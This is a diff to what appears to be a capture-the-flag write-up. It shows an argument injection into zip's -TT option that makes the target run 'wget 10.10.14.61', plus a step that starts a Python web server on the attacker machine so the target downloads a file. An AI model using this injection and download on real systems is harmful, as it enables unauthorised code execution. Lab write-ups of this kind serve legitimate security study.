@@ -165,8 +165,20 @@ Ill start by uploading `-T` then ending on `test.txt`
 The thought behind this command is
 
 ```python
-zip <ZIP UUID> -T '-TT id' test.txt
+zip <ZIP UUID> -T '-TT wget 10.10.14.61' test.txt
 ```
+
+This what the command will look like on the system
+
+```python
+python3 -m http.server 80
+```
+
+Ill start a web server
+
+Then download it
+
+
 
 
 
